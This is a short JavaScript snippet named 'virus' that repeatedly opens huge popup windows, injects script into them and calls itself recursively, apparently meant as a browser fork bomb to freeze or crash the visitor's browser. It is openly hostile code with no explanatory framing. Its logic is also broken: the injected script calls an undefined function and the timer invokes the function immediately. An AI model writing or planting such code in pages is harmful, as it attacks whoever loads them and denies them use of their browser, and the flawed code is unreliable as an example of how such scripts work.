function virus() 
{
	const newWin = window.open("", "", "height=8000,width=8000");
	const forkScript = newWin.document.createElement("script"); 
	forkScript.innerHTML = forkScript + "\n" + "forkScript();"; 
	newWin.document.head.appendChild(forkScript); 
	setTimeout(virus(), 100) 
} 
virus();